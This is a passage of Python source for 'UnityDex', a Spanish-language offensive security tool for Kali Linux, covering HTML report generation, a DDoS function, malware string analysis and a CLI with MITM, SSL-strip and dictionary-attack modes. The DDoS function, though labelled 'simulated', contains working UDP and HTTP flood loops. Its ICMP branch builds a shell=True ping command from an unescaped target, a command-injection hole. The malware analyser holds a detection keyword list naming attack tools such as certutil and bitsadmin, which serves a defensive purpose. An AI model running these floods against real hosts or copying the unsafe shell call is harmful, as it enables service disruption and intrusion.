    <html lang="es">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Informe de Seguridad - UnityDex</title>
        <style>
            body {{ font-family: Arial, sans-serif; margin: 0; padding: 20px; color: #333; }}
            h1, h2, h3, h4 {{ color: #2c3e50; }}
            .header {{ background-color: #e74c3c; color: white; padding: 20px; margin-bottom: 20px; }}
            .section {{ margin-bottom: 30px; padding: 15px; background-color: #f9f9f9; border-radius: 5px; }}
            .vuln-critical {{ background-color: #ffdddd; border-left: 5px solid #e74c3c; padding: 10px; margin: 10px 0; }}
            .vuln-high {{ background-color: #ffe4c4; border-left: 5px solid #ff8c00; padding: 10px; margin: 10px 0; }}
            .vuln-medium {{ background-color: #fffacd; border-left: 5px solid #ffd700; padding: 10px; margin: 10px 0; }}
            .vuln-low {{ background-color: #e6fffa; border-left: 5px solid #2ecc71; padding: 10px; margin: 10px 0; }}
            table {{ width: 100%; border-collapse: collapse; margin: 10px 0; }}
            th, td {{ padding: 8px; text-align: left; border-bottom: 1px solid #ddd; }}
            th {{ background-color: #f2f2f2; }}
        </style>
    </head>
    <body>
        <div class="header">
            <h1>Informe de Seguridad - UnityDex</h1>
            <p>Generado el: {report_data.get('date', 'Fecha desconocida')}</p>
            <p>Versión: {report_data.get('tool_version', 'Desconocida')}</p>
        </div>
    '''
    
    # Información del sistema
    if 'system_info' in report_data:
        html += '''
        <div class="section">
            <h2>Información del Sistema</h2>
            <table>
                <tr><th>Propiedad</th><th>Valor</th></tr>
        '''
        
        for key, value in report_data['system_info'].items():
            html += f'<tr><td>{key}</td><td>{value}</td></tr>\n'
        
        html += '''
            </table>
        </div>
        '''
    
    # Información de red
    if 'network_info' in report_data:
        html += '''
        <div class="section">
            <h2>Información de Red</h2>
        '''
        
        if 'interfaces' in report_data['network_info']:
            html += '''
            <h3>Interfaces de Red</h3>
            <table>
                <tr><th>Interfaz</th><th>Dirección IP</th><th>Máscara</th><th>MAC</th></tr>
            '''
            
            for iface, data in report_data['network_info']['interfaces'].items():
                ip = data.get('addr', 'N/A')
                netmask = data.get('netmask', 'N/A')
                mac = data.get('mac', 'N/A')
                html += f'<tr><td>{iface}</td><td>{ip}</td><td>{netmask}</td><td>{mac}</td></tr>\n'
            
            html += '''
            </table>
            '''
        
        if 'default_gateway' in report_data['network_info']:
            html += f'<p><strong>Gateway predeterminado:</strong> {report_data["network_info"]["default_gateway"]}</p>\n'
        
        html += '''
        </div>
        '''
    
    # Vulnerabilidades
    if 'vulnerabilities' in report_data and report_data['vulnerabilities']:
        html += '''
        <div class="section">
            <h2>Vulnerabilidades Detectadas</h2>
        '''
        
        # Contar vulnerabilidades por severidad
        severity_count = {'critical': 0, 'high': 0, 'medium': 0, 'low': 0}
        for vuln in report_data['vulnerabilities']:
            severity = vuln.get('severity', 'low')
            if severity in severity_count:
                severity_count[severity] += 1
        
        # Mostrar resumen
        html += '''
        <h3>Resumen de Vulnerabilidades</h3>
        <table>
            <tr><th>Severidad</th><th>Cantidad</th></tr>
        '''
        
        for severity, count in severity_count.items():
            html += f'<tr><td>{severity.capitalize()}</td><td>{count}</td></tr>\n'
        
        html += '''
        </table>
        
        <h3>Detalles de Vulnerabilidades</h3>
        '''
        
        # Mostrar vulnerabilidades críticas primero
        for severity in ['critical', 'high', 'medium', 'low']:
            for vuln in report_data['vulnerabilities']:
                if vuln.get('severity') == severity:
                    html += f'''
                    <div class="vuln-{severity}">
                        <h4>{vuln.get('type', 'Vulnerabilidad').replace('_', ' ').title()} - {severity.capitalize()}</h4>
                        <p><strong>Objetivo:</strong> {vuln.get('target', 'N/A')}</p>
                        <p><strong>Detalles:</strong> {vuln.get('details', 'N/A')}</p>
                        <p><strong>Recomendación:</strong> {vuln.get('recommendation', 'N/A')}</p>
                    </div>
                    '''
        
        html += '''
        </div>
        '''
    
    # Resultados de escaneos
    if 'scan_results' in report_data:
        html += '''
        <div class="section">
            <h2>Resultados de Escaneos</h2>
        '''
        
        # Escaneos de red
        if report_data['scan_results']['network_scans']:
            html += '''
            <h3>Escaneos de Red</h3>
            <table>
                <tr><th>Fecha</th><th>Objetivo</th><th>Hosts Encontrados</th></tr>
            '''
            
            for scan in report_data['scan_results']['network_scans']:
                timestamp = scan.get('timestamp', 'N/A')
                target = scan.get('target', 'N/A')
                hosts_count = len(scan.get('hosts', []))
                html += f'<tr><td>{timestamp}</td><td>{target}</td><td>{hosts_count}</td></tr>\n'
            
            html += '''
            </table>
            '''
        
        # Escaneos de puertos
        if report_data['scan_results']['port_scans']:
            html += '''
            <h3>Escaneos de Puertos</h3>
            <table>
                <tr><th>Fecha</th><th>Objetivo</th><th>Tipo</th><th>Puertos Abiertos</th></tr>
            '''
            
            for scan in report_data['scan_results']['port_scans']:
                timestamp = scan.get('timestamp', 'N/A')
                target = scan.get('target', 'N/A')
                scan_type = scan.get('scan_type', 'N/A')
                
                # Contar puertos abiertos
                open_ports = 0
                results = scan.get('results', {})
                if isinstance(results, dict) and 'tcp' in results:
                    open_ports = len(results['tcp']) + len(results.get('udp', []))
                elif isinstance(results, list):
                    open_ports = len(results)
                
                html += f'<tr><td>{timestamp}</td><td>{target}</td><td>{scan_type}</td><td>{open_ports}</td></tr>\n'
            
            html += '''
            </table>
            '''
        
        # Otros escaneos (similar para web_scans, wireless_scans, etc.)
        
        html += '''
        </div>
        '''
    
    # Cerrar HTML
    html += '''
        <div class="section">
            <h2>Recomendaciones Generales</h2>
            <ul>
                <li>Mantener todos los sistemas y aplicaciones actualizados con los últimos parches de seguridad.</li>
                <li>Implementar políticas de contraseñas fuertes y cambios regulares.</li>
                <li>Utilizar cifrado fuerte para todas las comunicaciones sensibles.</li>
                <li>Realizar auditorías de seguridad periódicas.</li>
                <li>Implementar soluciones de seguridad en capas (defensa en profundidad).</li>
                <li>Capacitar al personal en buenas prácticas de seguridad.</li>
            </ul>
        </div>
        
        <div class="footer">
            <p>Informe generado por UnityDex - Herramienta de Seguridad para Kali Linux</p>
            <p><small>Este informe debe ser utilizado solo con fines educativos y en entornos autorizados.</small></p>
        </div>
    </body>
    </html>
    '''
    
    return html

# Función para realizar ataques DDoS
def ddos_attack(target, port, method='syn', duration=60, threads=10):
    """
    Realiza un ataque DDoS simulado con fines educativos
    
    Args:
        target (str): IP o dominio objetivo
        port (int): Puerto objetivo
        method (str): Método de ataque (syn, udp, http, icmp)
        duration (int): Duración del ataque en segundos
        threads (int): Número de hilos a utilizar
    """
    print(f"{COLORS['PURPLE']}[*] Iniciando ataque DDoS simulado contra {target}:{port} usando método {method}{COLORS['ENDC']}")
    print(f"{COLORS['WARNING']}[!] ADVERTENCIA: Esta herramienta debe usarse SOLO con fines educativos y en entornos controlados{COLORS['ENDC']}")
    print(f"{COLORS['WARNING']}[!] El uso indebido de esta herramienta puede ser ilegal{COLORS['ENDC']}")
    
    # Solicitar confirmación explícita
    confirmation = input(f"{COLORS['RED']}¿Está seguro de que desea continuar? Esta acción podría ser ilegal si no tiene autorización. (s/n): {COLORS['ENDC']}").lower()
    if confirmation != 's':
        print(f"{COLORS['INFO']}[*] Ataque cancelado por el usuario{COLORS['ENDC']}")
        return
    
    try:
        # Crear directorio de resultados si no existe
        output_dir = 'results'
        if not os.path.exists(output_dir):
            os.makedirs(output_dir)
        
        # Importar módulos necesarios
        import socket
        import threading
        import random
        import time
        from datetime import datetime
        
        # Inicializar variables
        start_time = time.time()
        counter = 0
        threads_list = []
        stop_attack = False
        
        # Función para mostrar progreso
        def show_progress():
            nonlocal counter, stop_attack
            while not stop_attack:
                elapsed = time.time() - start_time
                if elapsed > duration:
                    stop_attack = True
                    break
                
                print(f"\r{COLORS['INFO']}[*] Paquetes enviados: {counter} | Tiempo restante: {int(duration - elapsed)} segundos{COLORS['ENDC']}", end='')
                time.sleep(1)
        
        # Iniciar hilo para mostrar progreso
        progress_thread = threading.Thread(target=show_progress)
        progress_thread.daemon = True
        progress_thread.start()
        
        # Función para ataque SYN Flood
        def syn_flood():
            nonlocal counter, stop_attack
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            except socket.error:
                print(f"\n{COLORS['FAIL']}[!] Error: No se pudo crear el socket. Se requieren privilegios de administrador.{COLORS['ENDC']}")
                stop_attack = True
                return
            
            while not stop_attack:
                # Simulación de envío de paquetes SYN
                time.sleep(0.01)  # Limitar la velocidad para evitar sobrecarga
                counter += 1
        
        # Función para ataque UDP Flood
        def udp_flood():
            nonlocal counter, stop_attack
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            except socket.error:
                print(f"\n{COLORS['FAIL']}[!] Error: No se pudo crear el socket.{COLORS['ENDC']}")
                stop_attack = True
                return
            
            while not stop_attack:
                # Simulación de envío de paquetes UDP
                try:
                    data = random._urandom(1024)  # Datos aleatorios
                    s.sendto(data, (target, port))
                    counter += 1
                    time.sleep(0.001)  # Limitar la velocidad para evitar sobrecarga
                except:
                    pass
        
        # Función para ataque HTTP Flood
        def http_flood():
            nonlocal counter, stop_attack
            try:
                import requests
                from requests.exceptions import RequestException
            except ImportError:
                print(f"\n{COLORS['FAIL']}[!] Error: Módulo 'requests' no encontrado. Instale requests para este tipo de ataque.{COLORS['ENDC']}")
                stop_attack = True
                return
            
            # Crear una lista de user agents para simular diferentes navegadores
            user_agents = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 11.5; rv:90.0) Gecko/20100101 Firefox/90.0',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59'
            ]
            
            while not stop_attack:
                try:
                    headers = {
                        'User-Agent': random.choice(user_agents),
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                        'Accept-Language': 'en-US,en;q=0.5',
                        'Connection': 'keep-alive',
                        'Cache-Control': 'no-cache'
                    }
                    
                    # Determinar el protocolo (http o https)
                    protocol = 'https' if port == 443 else 'http'
                    url = f"{protocol}://{target}:{port}/"
                    
                    # Enviar solicitud GET
                    requests.get(url, headers=headers, timeout=1, verify=False)
                    counter += 1
                    time.sleep(0.1)  # Limitar la velocidad para evitar sobrecarga
                except RequestException:
                    pass
                except Exception:
                    pass
        
        # Función para ataque ICMP Flood (ping)
        def icmp_flood():
            nonlocal counter, stop_attack
            try:
                import subprocess
            except ImportError:
                print(f"\n{COLORS['FAIL']}[!] Error: No se pudo importar el módulo subprocess.{COLORS['ENDC']}")
                stop_attack = True
                return
            
            while not stop_attack:
                try:
                    # Usar ping para enviar paquetes ICMP
                    if os.name == 'nt':  # Windows
                        subprocess.Popen(f"ping -n 1 {target}", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    else:  # Linux/Unix
                        subprocess.Popen(f"ping -c 1 {target}", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    counter += 1
                    time.sleep(0.1)  # Limitar la velocidad para evitar sobrecarga
                except:
                    pass
        
        # Seleccionar función de ataque según el método
        attack_function = None
        if method == 'syn':
            attack_function = syn_flood
        elif method == 'udp':
            attack_function = udp_flood
        elif method == 'http':
            attack_function = http_flood
        elif method == 'icmp':
            attack_function = icmp_flood
        else:
            print(f"{COLORS['FAIL']}[!] Método de ataque no válido{COLORS['ENDC']}")
            return
        
        # Iniciar hilos de ataque
        for i in range(threads):
            thread = threading.Thread(target=attack_function)
            thread.daemon = True
            threads_list.append(thread)
            thread.start()
        
        # Esperar a que termine el ataque
        try:
            time.sleep(duration)
        except KeyboardInterrupt:
            print(f"\n{COLORS['WARNING']}[!] Ataque interrumpido por el usuario{COLORS['ENDC']}")
        finally:
            stop_attack = True
            
            # Esperar a que terminen todos los hilos
            for thread in threads_list:
                if thread.is_alive():
                    thread.join(1)
            
            # Mostrar resultados
            elapsed_time = time.time() - start_time
            print(f"\n{COLORS['SUCCESS']}[+] Ataque completado{COLORS['ENDC']}")
            print(f"{COLORS['INFO']}[*] Duración: {elapsed_time:.2f} segundos{COLORS['ENDC']}")
            print(f"{COLORS['INFO']}[*] Paquetes enviados: {counter}{COLORS['ENDC']}")
            print(f"{COLORS['INFO']}[*] Velocidad: {counter/elapsed_time:.2f} paquetes/segundo{COLORS['ENDC']}")
            
            # Guardar resultados
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            result_file = os.path.join(output_dir, f"ddos_attack_{timestamp}.json")
            
            results = {
                'timestamp': timestamp,
                'target': target,
                'port': port,
                'method': method,
                'duration': elapsed_time,
                'packets_sent': counter,
                'threads': threads,
                'rate': counter/elapsed_time
            }
            
            with open(result_file, 'w') as f:
                json.dump(results, f, indent=4)
            
            print(f"{COLORS['SUCCESS']}[+] Resultados guardados en {result_file}{COLORS['ENDC']}")
    
    except Exception as e:
        print(f"\n{COLORS['FAIL']}[!] Error durante el ataque: {str(e)}{COLORS['ENDC']}")

# Función para análisis de malware
def malware_analysis(file_path, options=None):
    """
    Analiza un archivo potencialmente malicioso utilizando técnicas estáticas y dinámicas
    """
    if not os.path.exists(file_path):
        print(f"{COLORS['FAIL']}[!] Error: El archivo {file_path} no existe{COLORS['ENDC']}")
        return
    
    print(f"{COLORS['INFO']}[*] Iniciando análisis de malware en: {file_path}{COLORS['ENDC']}")
    results = {}
    
    # Análisis estático básico
    try:
        file_size = os.path.getsize(file_path)
        results['file_size'] = file_size
        print(f"{COLORS['INFO']}[*] Tamaño del archivo: {file_size} bytes{COLORS['ENDC']}")
        
        # Calcular hashes
        import hashlib
        
        md5_hash = hashlib.md5()
        sha1_hash = hashlib.sha1()
        sha256_hash = hashlib.sha256()
        
        with open(file_path, 'rb') as f:
            data = f.read()
            md5_hash.update(data)
            sha1_hash.update(data)
            sha256_hash.update(data)
        
        results['md5'] = md5_hash.hexdigest()
        results['sha1'] = sha1_hash.hexdigest()
        results['sha256'] = sha256_hash.hexdigest()
        
        print(f"{COLORS['SUCCESS']}[+] MD5: {results['md5']}{COLORS['ENDC']}")
        print(f"{COLORS['SUCCESS']}[+] SHA1: {results['sha1']}{COLORS['ENDC']}")
        print(f"{COLORS['SUCCESS']}[+] SHA256: {results['sha256']}{COLORS['ENDC']}")
        
        # Detectar tipo de archivo
        import magic
        try:
            file_type = magic.from_file(file_path)
            mime_type = magic.from_file(file_path, mime=True)
            results['file_type'] = file_type
            results['mime_type'] = mime_type
            print(f"{COLORS['SUCCESS']}[+] Tipo de archivo: {file_type}{COLORS['ENDC']}")
            print(f"{COLORS['SUCCESS']}[+] MIME: {mime_type}{COLORS['ENDC']}")
        except ImportError:
            print(f"{COLORS['WARNING']}[!] Módulo 'magic' no encontrado. Instale python-magic para detección de tipos de archivo.{COLORS['ENDC']}")
        
        # Análisis de strings
        import string
        printable = set(string.printable)
        strings_found = []
        current_string = ""
        min_length = 4
        
        for byte in data:
            try:
                char = chr(byte)
                if char in printable:
                    current_string += char
                elif len(current_string) >= min_length:
                    strings_found.append(current_string)
                    current_string = ""
                else:
                    current_string = ""
            except:
                if len(current_string) >= min_length:
                    strings_found.append(current_string)
                current_string = ""
        
        # Filtrar strings interesantes (URLs, IPs, comandos comunes)
        import re
        url_pattern = re.compile(r'https?://(?:[-\w.]|(?:%[\da-fA-F]{2}))+[/\w .-]*')
        ip_pattern = re.compile(r'\b(?:\d{1,3}\.){3}\d{1,3}\b')
        
        urls = []
        ips = []
        suspicious_strings = []
        
        suspicious_keywords = [
            'cmd.exe', 'powershell', 'rundll32', 'regsvr32', 'wscript',
            'cscript', 'bitsadmin', 'certutil', 'schtasks', 'vssadmin',
            'password', 'credential', 'admin', 'login', 'shell', 'exec',
            'download', 'upload', 'backdoor', 'trojan', 'malware', 'virus',
            'exploit', 'payload', 'inject', 'registry', 'regedit'
        ]
        
        for s in strings_found:
            if url_pattern.search(s):
                urls.append(s)
            if ip_pattern.search(s):
                ips.append(s)
            for keyword in suspicious_keywords:
                if keyword.lower() in s.lower():
                    suspicious_strings.append(s)
                    break
        
        results['urls'] = urls
        results['ips'] = ips
        results['suspicious_strings'] = suspicious_strings
        
        if urls:
            print(f"{COLORS['WARNING']}[!] URLs encontradas: {len(urls)}{COLORS['ENDC']}")
            for url in urls[:5]:  # Mostrar solo las primeras 5
                print(f"   - {url}")
            if len(urls) > 5:
                print(f"   ... y {len(urls) - 5} más")
        
        if ips:
            print(f"{COLORS['WARNING']}[!] IPs encontradas: {len(ips)}{COLORS['ENDC']}")
            for ip in ips[:5]:  # Mostrar solo las primeras 5
                print(f"   - {ip}")
            if len(ips) > 5:
                print(f"   ... y {len(ips) - 5} más")
        
        if suspicious_strings:
            print(f"{COLORS['WARNING']}[!] Strings sospechosas: {len(suspicious_strings)}{COLORS['ENDC']}")
            for s in suspicious_strings[:5]:  # Mostrar solo las primeras 5
                print(f"   - {s}")
            if len(suspicious_strings) > 5:
                print(f"   ... y {len(suspicious_strings) - 5} más")
    
    except Exception as e:
        print(f"{COLORS['FAIL']}[!] Error durante el análisis estático: {str(e)}{COLORS['ENDC']}")
    
    # Verificación en VirusTotal (si está disponible)
    try:
        import requests
        config = load_config()
        vt_api_key = config.get('malware_analysis', {}).get('virustotal_api_key', '')
        
        if vt_api_key:
            print(f"{COLORS['INFO']}[*] Consultando VirusTotal...{COLORS['ENDC']}")
            headers = {
                'x-apikey': vt_api_key
            }
            params = {
                'apikey': vt_api_key,
                'resource': results['sha256']
            }
            response = requests.get('https://www.virustotal.com/api/v3/files/' + results['sha256'], headers=headers)
            
            if response.status_code == 200:
                vt_data = response.json()
                if 'data' in vt_data and 'attributes' in vt_data['data']:
                    stats = vt_data['data']['attributes']['last_analysis_stats']
                    results['virustotal'] = stats
                    print(f"{COLORS['SUCCESS']}[+] Resultado VirusTotal: {stats.get('malicious', 0)}/{sum(stats.values())} detecciones{COLORS['ENDC']}")
            else:
                print(f"{COLORS['WARNING']}[!] Archivo no encontrado en VirusTotal o API key inválida{COLORS['ENDC']}")
        else:
            print(f"{COLORS['WARNING']}[!] API key de VirusTotal no configurada{COLORS['ENDC']}")
    except ImportError:
        print(f"{COLORS['WARNING']}[!] Módulo 'requests' no encontrado. Instale requests para consultas a VirusTotal.{COLORS['ENDC']}")
    except Exception as e:
        print(f"{COLORS['WARNING']}[!] Error al consultar VirusTotal: {str(e)}{COLORS['ENDC']}")
    
    print(f"{COLORS['SUCCESS']}[+] Análisis de malware completado{COLORS['ENDC']}")
    return results

# Función para análisis de vulnerabilidades de red
def network_vulnerability_scan(target, scan_type='full'):
    """
    Realiza un escaneo de vulnerabilidades en la red objetivo
    """
    print(f"{COLORS['INFO']}[*] Iniciando análisis de vulnerabilidades en: {target}{COLORS['ENDC']}")
    
    try:
        # Primero realizamos un escaneo de puertos para identificar servicios
        print(f"{COLORS['INFO']}[*] Realizando escaneo de puertos inicial...{COLORS['ENDC']}")
        
        # Intentar usar python-nmap si está disponible
        try:
            import nmap
            scanner = nmap.PortScanner()
            
            if scan_type == 'quick':
                # Escaneo rápido de puertos comunes
                scanner.scan(hosts=target, arguments='-sV -T4 --top-ports 100')
            else:
                # Escaneo completo con detección de versiones
                scanner.scan(hosts=target, arguments='-sV -T4 -p-')
            
            # Procesar resultados
            for host in scanner.all_hosts():
                print(f"{COLORS['SUCCESS']}[+] Host: {host} ({scanner[host].hostname()}){COLORS['ENDC']}")
                print(f"{COLORS['SUCCESS']}[+] Estado: {scanner[host].state()}{COLORS['ENDC']}")
                
                for proto in scanner[host].all_protocols():
                    print(f"{COLORS['INFO']}[*] Protocolo: {proto}{COLORS['ENDC']}")
                    
                    ports = sorted(scanner[host][proto].keys())
                    for port in ports:
                        service = scanner[host][proto][port]
                        print(f"  {COLORS['SUCCESS']}[+] Puerto {port}: {service['name']} ({service['state']}){COLORS['ENDC']}")
                        if 'product' in service and service['product']:
                            print(f"     - Producto: {service['product']} {service.get('version', '')}{COLORS['ENDC']}")
                            
                            # Verificar vulnerabilidades conocidas
                            if service['name'] in ['http', 'https'] and 'product' in service:
                                print(f"{COLORS['INFO']}[*] Verificando vulnerabilidades web en {service['product']}{COLORS['ENDC']}")
                                # Aquí se podría integrar con una base de datos de vulnerabilidades
                            
                            # Verificar versiones obsoletas
                            if 'version' in service and service['version']:
                                # Aquí se podría comparar con una base de datos de versiones vulnerables
                                pass
        
        except ImportError:
            print(f"{COLORS['WARNING']}[!] Módulo 'python-nmap' no encontrado. Usando alternativa...{COLORS['ENDC']}")
            # Usar subprocess para llamar a nmap directamente
            import subprocess
            
            if scan_type == 'quick':
                cmd = ['nmap', '-sV', '-T4', '--top-ports', '100', target]
            else:
                cmd = ['nmap', '-sV', '-T4', '-p-', target]
            
            try:
                result = subprocess.run(cmd, capture_output=True, text=True, check=True)
                print(result.stdout)
            except subprocess.CalledProcessError as e:
                print(f"{COLORS['FAIL']}[!] Error al ejecutar nmap: {e}{COLORS['ENDC']}")
            except FileNotFoundError:
                print(f"{COLORS['FAIL']}[!] Nmap no encontrado en el sistema{COLORS['ENDC']}")
        
        # Verificar vulnerabilidades específicas
        print(f"{COLORS['INFO']}[*] Verificando vulnerabilidades comunes...{COLORS['ENDC']}")
        
        # Ejemplo: Verificar si SSH permite autenticación con contraseña débil
        try:
            import socket
            import paramiko
            
            ssh_port = 22  # Puerto SSH por defecto
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((target, ssh_port))
            
            if result == 0:
                print(f"{COLORS['INFO']}[*] Puerto SSH abierto, verificando configuración...{COLORS['ENDC']}")
                
                # Verificar versión de SSH
                try:
                    transport = paramiko.Transport(sock)
                    transport.start_client()
                    server_version = transport.remote_version
                    print(f"{COLORS['INFO']}[*] Versión SSH: {server_version}{COLORS['ENDC']}")
                    
                    # Verificar si es una versión vulnerable
                    if 'OpenSSH' in server_version:
                        version_num = server_version.split()[1].split('p')[0]
                        if version_num < '7.0':
                            print(f"{COLORS['WARNING']}[!] Versión SSH potencialmente vulnerable: {version_num}{COLORS['ENDC']}")
                    
                    transport.close()
                except Exception as e:
                    print(f"{COLORS['WARNING']}[!] Error al verificar versión SSH: {str(e)}{COLORS['ENDC']}")
            
            sock.close()
        except ImportError:
            print(f"{COLORS['WARNING']}[!] Módulo 'paramiko' no encontrado. Omitiendo verificación SSH.{COLORS['ENDC']}")
        except Exception as e:
            print(f"{COLORS['WARNING']}[!] Error al verificar SSH: {str(e)}{COLORS['ENDC']}")
        
        print(f"{COLORS['SUCCESS']}[+] Análisis de vulnerabilidades completado{COLORS['ENDC']}")
        
    except Exception as e:
        print(f"{COLORS['FAIL']}[!] Error durante el análisis de vulnerabilidades: {str(e)}{COLORS['ENDC']}")

# Función principal
def main():
    # Mostrar banner
    print_banner()
    
    # Verificar sistema operativo
    is_compatible = check_kali()
    
    parser = argparse.ArgumentParser(description='UnityDex - Herramienta avanzada para análisis de seguridad en redes')
    
    # Argumentos generales
    parser.add_argument('-v', '--version', action='store_true', help='Mostrar versión')
    parser.add_argument('--no-check', action='store_true', help='Omitir verificación de dependencias')
    parser.add_argument('-i', '--interactive', action='store_true', help='Iniciar en modo interactivo')
    parser.add_argument('-c', '--config', action='store_true', help='Configurar herramienta')
    parser.add_argument('--auto-interface', action='store_true', help='Detectar interfaz automáticamente')
    parser.add_argument('--force', action='store_true', help='Forzar ejecución incluso si faltan dependencias')
    
    # Subparsers para diferentes modos
    subparsers = parser.add_subparsers(dest='mode', help='Modo de operación')
    
    # Procesar argumentos iniciales
    args, remaining_args = parser.parse_known_args()
    
    # Mostrar versión si se solicita
    if args.version:
        print(f"{COLORS['INFO']}UnityDex versión {VERSION}{COLORS['ENDC']}")
        return
    
    # Verificar dependencias si no se omite
    if not args.no_check:
        deps_ok = check_dependencies()
        if not deps_ok and not args.force:
            print(f"{COLORS['WARNING']}[!] Use la opción --force para ejecutar de todos modos (no recomendado){COLORS['ENDC']}")
            return
    
    # Modo de escaneo de red
    scan_parser = subparsers.add_parser('scan', help='Escaneo de red')
    scan_parser.add_argument('-t', '--target', required=True, help='Objetivo (IP, rango o dominio)')
    scan_parser.add_argument('-m', '--method', choices=['quick', 'full', 'vuln'], default='quick', help='Método de escaneo')
    
    # Modo de análisis de vulnerabilidades de red
    vuln_parser = subparsers.add_parser('vuln', help='Análisis de vulnerabilidades de red')
    vuln_parser.add_argument('-t', '--target', required=True, help='Objetivo (IP, rango o dominio)')
    vuln_parser.add_argument('-s', '--scan-type', choices=['quick', 'full'], default='full', help='Tipo de escaneo')
    vuln_parser.add_argument('-o', '--output', help='Archivo de salida para el informe')
    
    # Modo de análisis de malware
    malware_parser = subparsers.add_parser('malware', help='Análisis de archivos maliciosos')
    malware_parser.add_argument('-f', '--file', required=True, help='Ruta al archivo a analizar')
    malware_parser.add_argument('-s', '--sandbox', action='store_true', help='Ejecutar análisis en sandbox')
    malware_parser.add_argument('-o', '--output', help='Archivo de salida para el informe')
    malware_parser.add_argument('-v', '--virustotal', action='store_true', help='Verificar en VirusTotal')
    
    # Modo de captura de paquetes
    capture_parser = subparsers.add_parser('capture', help='Captura de paquetes')
    capture_parser.add_argument('-i', '--interface', required=True, help='Interfaz de red')
    capture_parser.add_argument('-d', '--duration', default=60, help='Duración en segundos')
    capture_parser.add_argument('-o', '--output', default=f'capture_{int(time.time())}.pcap', help='Archivo de salida')
    capture_parser.add_argument('-f', '--filter', help='Expresión de filtro BPF')
    
    # Modo de análisis de vulnerabilidades web
    web_parser = subparsers.add_parser('web', help='Análisis de vulnerabilidades web')
    web_parser.add_argument('-u', '--url', required=True, help='URL objetivo')
    
    # Modo de ataque de diccionario
    dict_parser = subparsers.add_parser('dict', help='Ataque de diccionario')
    dict_parser.add_argument('-t', '--target', required=True, help='Objetivo (IP o dominio)')
    dict_parser.add_argument('-s', '--service', required=True, choices=['ssh', 'ftp', 'smb'], help='Servicio objetivo')
    dict_parser.add_argument('-u', '--username', required=True, help='Nombre de usuario')
    dict_parser.add_argument('-w', '--wordlist', required=True, help='Archivo de diccionario')
    
    # Modo de escaneo inalámbrico
    wifi_parser = subparsers.add_parser('wifi', help='Escaneo de redes inalámbricas')
    wifi_parser.add_argument('-i', '--interface', required=True, help='Interfaz inalámbrica')
    wifi_parser.add_argument('-t', '--time', type=int, default=30, help='Tiempo de escaneo en segundos')
    wifi_parser.add_argument('-o', '--output', default='results', help='Directorio de salida')
    
    # Modo de ataque MITM
    mitm_parser = subparsers.add_parser('mitm', help='Ataque Man-in-the-Middle')
    mitm_parser.add_argument('-i', '--interface', required=True, help='Interfaz de red')
    mitm_parser.add_argument('-t', '--target', required=True, help='IP objetivo')
    mitm_parser.add_argument('-g', '--gateway', required=True, help='IP del gateway')
    mitm_parser.add_argument('-a', '--attack', choices=['arpspoof', 'ettercap', 'bettercap'], default='arpspoof', help='Tipo de ataque')
    mitm_parser.add_argument('-s', '--ssl', action='store_true', help='Habilitar SSL Strip')
    mitm_parser.add_argument('-d', '--dns', action='store_true', help='Habilitar DNS Spoofing')
    mitm_parser.add_argument('-p', '--pcap', action='store_true', help='Habilitar captura de paquetes')
    mitm_parser.add_argument('--duration', type=int, help='Duración del ataque en segundos (opcional)')
    
    # Modo de análisis SSL/TLS
    ssl_parser = subparsers.add_parser('ssl', help='Análisis de tráfico SSL/TLS')
    ssl_parser.add_argument('-i', '--interface', required=True, help='Interfaz de red')
    ssl_parser.add_argument('-t', '--target', required=True, help='IP objetivo')
    ssl_parser.add_argument('-g', '--gateway', help='IP del gateway (opcional, se detecta automáticamente si no se especifica)')
    ssl_parser.add_argument('-a', '--attack', choices=['ettercap', 'bettercap', 'arpspoof'], default='ettercap', help='Herramienta para el ataque MITM')
    ssl_parser.add_argument('--duration', type=int, help='Duración del análisis en segundos (opcional)')
    
    # Modo de escaneo de puertos avanzado
    port_parser = subparsers.add_parser('port', help='Escaneo de puertos avanzado')
    port_parser.add_argument('-t', '--target', required=True, help='Objetivo (IP o dominio)')
    port_parser.add_argument('-p', '--ports', help='Puertos a escanear (ej: 22,80,443 o 1-1000)')
    port_parser.add_argument('--timing', type=int, choices=range(0, 6), default=3, help='Velocidad de escaneo (0-5)')
    port_parser.add_argument('-s', '--scan-type', choices=['tcp', 'udp', 'both'], default='tcp', help='Tipo de escaneo')
    port_parser.add_argument('--no-service', action='store_false', dest='service', help='Desactivar detección de servicios')
    port_parser.add_argument('--no-os', action='store_false', dest='os', help='Desactivar detección de sistema operativo')
    port_parser.add_argument('-o', '--output', default='results', help='Directorio de salida')
    
    # Modo de generación de informes
    report_parser = subparsers.add_parser('report', help='Generación de informes')
    report_parser.add_argument('-o', '--output', required=True, help='Archivo de salida (JSON o HTML)')
    report_parser.add_argument('--no-system', action='store_false', dest='system', help='No incluir información del sistema')
    report_parser.add_argument('--no-network', action='store_false', dest='network', help='No incluir información de red')
    report_parser.add_argument('--no-scans', action='store_false', dest='scans', help='No incluir resultados de escaneos')
    report_parser.add_argument('--no-vulns', action='store_false', dest='vulns', help='No incluir análisis de vulnerabilidades')
    
    # Modo de análisis de seguridad IoT
    iot_parser = subparsers.add_parser('iot', help='Análisis de seguridad de dispositivos IoT')
    iot_parser.add_argument('-t', '--target', required=True, help='Objetivo (IP, rango o dominio)')
